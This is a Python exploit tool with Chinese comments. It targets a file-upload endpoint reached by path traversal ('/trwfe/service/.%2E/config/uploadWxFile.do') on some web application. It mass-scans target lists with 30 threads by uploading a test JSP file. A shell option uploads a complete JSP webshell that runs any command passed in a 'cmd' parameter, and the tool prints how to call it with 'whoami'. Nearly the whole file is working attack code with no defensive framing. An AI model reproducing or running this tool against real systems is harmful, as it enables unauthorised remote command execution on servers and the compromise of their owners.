import os
import textwrap
from multiprocessing.dummy import Pool
import requests, argparse
from colorama import init, Fore, Back, Style
import warnings
import ssl
import urllib3

# 抑制所有警告
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 初始化colorama
init(autoreset=True)

def main(url, file_path,shell):
    if file_path:
        scan_more_url(file_path)
    elif url:
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        scan_one_url(url)
    elif shell:
        if not shell.startswith(('http://', 'https://')):
            shell = f"http://{shell}"
        upload_webshell(shell)
    else:
        print(Fore.RED + "错误：请提供URL或文件路径")

def upload_webshell(url, shell_name="shell.jsp"):
    """
    上传JSP一句话木马到目标服务器
    """
    url1 = f"{url.rstrip('/')}/trwfe/service/.%2E/config/uploadWxFile.do"
    # JSP一句话木马内容
    webshell_content = """<%@page import="java.util.*,java.io.*"%>
    <%
    if(request.getParameter("cmd")!=null){
        Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in=p.getInputStream();
        DataInputStream dis=new DataInputStream(in);
        String disr=dis.readLine();
        while(disr!=null){
            out.println(disr);
            disr=dis.readLine();
        }
    }
    %>"""

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }

    files = {
        'file': (shell_name, webshell_content, 'application/octet-stream')
    }
    try:
        print(Fore.CYAN + f"[*] 尝试上传Webshell到: {url}")
        response = requests.post(url=url1, files=files, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            # 检查上传是否成功
            if "trwfe" in response.text or "true" in response.text.lower():
                print(Fore.GREEN + f"[+] Webshell上传成功!")
                print(Fore.GREEN + f"[+] 尝试访问: {url}/{shell_name}?cmd=whoami -- 若【404】则被查杀")
                return True
            else:
                print(Fore.YELLOW + f"[!] 上传完成但响应异常: {response.text[:100]}...")
                return False
        else:
            print(Fore.RED + f"[-] 上传失败，状态码: {response.status_code}")
            return False

    except requests.exceptions.Timeout:
        print(Fore.YELLOW + f"[超时] 上传请求超时")
    except requests.exceptions.ConnectionError:
        print(Fore.YELLOW + f"[连接失败] 无法连接到目标")
    except Exception as e:
        print(Fore.YELLOW + f"[错误] 上传过程中出错: {str(e)}")

    return False

def scan_one_url(url):
    url1 = f"{url.rstrip('/')}/trwfe/service/.%2E/config/uploadWxFile.do"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }

    # 要上传的文件内容
    file_content = """<%@page import="java.util.*,java.io.*"%>
    <%
    
    %>"""

    # 使用files参数上传
    files = {
        'file': ('ac.jsp', file_content, 'application/octet-stream')
    }
    try:
        response = requests.post(url=url1, files=files, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            # 检查多种成功条件
            if ("trwfe" in response.text or
                    "true" in response.text.lower() or
                    "success" in response.text.lower()):
                print(Fore.GREEN + f"[+] 上传成功: {url}/ac.jsp")
                return True
            else:
                print(Fore.YELLOW + f"[!] 未知响应: {response.text[:100]}...")
                return False
        else:
            print(Fore.RED + f"[-] 上传失败: {url} - 状态码: {response.status_code}")
            return False
    #这里是报错处理
    except requests.exceptions.Timeout:
        print(Fore.YELLOW + f"[超时]: {url} | 请求超时")
    except requests.exceptions.ConnectionError:
        print(Fore.YELLOW + f"[连接失败]: {url} | 无法建立连接")
    except requests.exceptions.TooManyRedirects:
        print(Fore.YELLOW + f"[重定向过多]: {url} | 重定向次数过多")
    except requests.exceptions.RequestException as e:
        # 抑制其他请求错误的具体信息
        print(Fore.YELLOW + f"[请求错误]: {url}")
    except Exception as e:
        # 抑制所有其他异常的具体信息
        print(Fore.YELLOW + f"[未知错误]: {url}")


def scan_more_url(file_path, threads=30):
    try:
        if not os.path.exists(file_path):
            print(Fore.RED + f"文件不存在: {file_path}")
            return
        with open(file_path, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        processed_urls = []
        for url in urls:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            processed_urls.append(url)
        with Pool(min(threads, len(processed_urls))) as pool:
            pool.map(scan_one_url, processed_urls)
    except FileNotFoundError:
        print(Fore.RED + f"文件不存在: {file_path}")
    except UnicodeDecodeError:
        print(Fore.RED + f"文件编码错误: {file_path}")
    except Exception:
        # 抑制其他所有错误的具体信息
        print(Fore.RED + f"文件处理错误: {file_path}")


if __name__ == '__main__':
    banner = """
                   __====-_  _-====___
          _--^^^#####//       \#####^^^--_
       _-^##########// (    )  \##########^-_
      -############//  |\^^/|   \############-
    _/############//   (@::@)    \############\_
   /#############((     \ //     ))#############
  -###############\     (oo)    //###############-
 -#################\   / VV \  //#################-
-###################\ /      \//###################-
_#/|##########/\######(   /\   )######/\##########|\#_
|/ |#/\#/\#/\/  \#/\##\  |  |  /##/\#/  \/\#/\#/\#| \|
`  |/  V  V  `   V  \#\| |  | |/#/  V   '  V  V  \|  '
   `   `  `      `   / | |  | | \   '      '  '   '
                    (  | |  | |  )
                   __\ | |  | | /__
                  (vvv(VVV)(VVV)vvv)
"""
    print(banner)
    parser = argparse.ArgumentParser(description='漏洞扫描工具',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
    python scan.py -u http://example.com       # 扫描单个URL
    python scan.py -r urls.txt                 # 批量扫描文件
    '''))
    parser.add_argument("-u", "--url", dest="url", type=str,
                        help="扫描单个URL")
    parser.add_argument("-r", "--file", dest="file", type=str,
                        help="批量扫描URL文件")
    parser.add_argument("-s", "--shell", dest="shell", type=str,
                        help="上传whell")
    args = parser.parse_args()
    main(args.url, args.file,args.shell)